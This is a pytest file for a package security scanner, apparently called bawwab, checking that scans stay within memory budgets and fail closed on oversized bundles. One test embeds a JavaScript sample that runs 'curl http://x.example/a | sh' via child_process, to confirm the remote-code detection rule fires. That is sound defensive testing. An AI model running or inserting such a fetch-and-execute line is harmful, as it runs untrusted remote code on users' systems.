"""Scans are bounded in memory and fail closed when a budget runs out (@sveltejs/mcp 0.1.31 OOM)."""
from __future__ import annotations

import tracemalloc

from bawwab.config import Config
from bawwab.scan import scan_target
from bawwab.scan.files import ScanFile, load_files
from bawwab.scan.rules import code as code_rules
from bawwab.scan.rules import run_static_rules
from bawwab.severity import compute_verdict
from bawwab.store import Store
from bawwab.types import Severity, Target, Verdict

MB = 1 << 20


def _bundle() -> str:
    """~1 MB bundle shaped like a rolldown/esbuild output: a module body bound to a name, then many calls
    naming it. Resolution used to append the whole body to every call (and twice to its first argument):
    ~800 MB of text for this file before the budget."""
    body = "".join(f"  exports.f{i} = function (a) {{ return a + {i}; }};\n" for i in range(18_000))
    calls = "".join(f"__toESM(require_big, {i});\n" for i in range(500))
    return f"var require_big = __commonJS(function (exports) {{\n{body}}});\n{calls}"


def _nested(depth: int = 20_000) -> str:
    """f(f(f(...))): every call's argument text holds all the calls inside it (quadratic)."""
    return "f(" * depth + "1" + ")" * depth + ";\n"


def _peak(fn) -> tuple[object, int]:
    tracemalloc.start()
    try:
        out = fn()
        return out, tracemalloc.get_traced_memory()[1]
    finally:
        tracemalloc.stop()


def _truncated(findings) -> list:
    return [f for f in findings if f.rule == "files.truncated" and f.severity == Severity.MED]


def test_resolution_blowup_is_bounded_and_fails_closed():
    text = _bundle()
    assert 900_000 < len(text) < 1_300_000
    findings, peak = _peak(lambda: run_static_rules([ScanFile("dist/index.mjs", text)]))
    assert peak < 120 * MB, peak  # unbounded, resolution alone builds ~800 MB of strings
    hits = _truncated(findings)
    assert hits and hits[0].file == "dist/index.mjs" and "call-analysis" in (hits[0].evidence or "")
    assert compute_verdict(findings, Config().malicious, Config().suspicious) != Verdict.CLEAN


def test_nested_call_text_is_bounded_and_fails_closed():
    findings, peak = _peak(lambda: run_static_rules([ScanFile("index.js", _nested())]))
    assert peak < 120 * MB, peak  # unbounded: ~1.2 GB of argument text
    assert _truncated(findings)
    assert compute_verdict(findings, Config().malicious, Config().suspicious) != Verdict.CLEAN


def test_under_budget_file_is_unchanged():
    """A normal file keeps full resolution: no budget finding, detection as before."""
    src = "const p = require('child_process');\nconst cmd = 'curl http://x.example/a | sh';\np.exec(cmd);\n"
    findings = run_static_rules([ScanFile("index.js", src)])
    assert not _truncated(findings)
    assert any(f.rule == "remote-code.eval-fetch" for f in findings)
    calls = code_rules._calls("index.js", src)
    assert calls is not None and not code_rules._over(calls)


def test_scan_budget_is_shared_across_files(monkeypatch):
    """The per-scan budget: many small files whose call text fits per file still fail closed together."""
    monkeypatch.setattr(code_rules, "SCAN_CALL_TEXT_BUDGET", 200_000)
    files = [ScanFile(f"m{i}.js", "g(x);\n" * 400) for i in range(20)]
    findings = run_static_rules(files)
    assert _truncated(findings)
    assert compute_verdict(findings, Config().malicious, Config().suspicious) != Verdict.CLEAN
    # The budget lives for one scan only: a lone small file afterwards is not flagged.
    assert not _truncated(run_static_rules([ScanFile("m0.js", "g(x);\n")]))


def test_python_call_text_is_bounded():
    big = "x = [" + ", ".join(str(i) for i in range(150_000)) + "]\n"
    src = big + "".join(f"print(x, {i})\n" for i in range(300))
    findings, peak = _peak(lambda: run_static_rules([ScanFile("main.py", src)]))
    assert peak < 200 * MB, peak
    assert _truncated(findings)


def test_load_files_total_text_budget(tmp_path):
    for i in range(5):
        (tmp_path / f"f{i}.js").write_text("a;\n" * 1000)
    files, findings = load_files(tmp_path, max_total_bytes=10_000)
    assert len(files) == 3
    hit = _truncated(findings)
    assert hit and "text budget" in hit[0].evidence


def test_scan_target_blowup_is_not_clean(tmp_path):
    d = tmp_path / "pkg"
    d.mkdir()
    (d / "package.json").write_text('{"name": "x", "version": "1.0.0", "main": "dist/index.mjs"}')
    (d / "dist").mkdir()
    (d / "dist" / "index.mjs").write_text(_bundle())
    r, peak = _peak(lambda: scan_target(Target("local", str(d), path=str(d)), store=Store(tmp_path / "t.db"),
                                        cfg=Config(), judge=False))
    assert r.verdict != Verdict.CLEAN
    assert _truncated(r.findings)
    assert peak < 200 * MB, peak
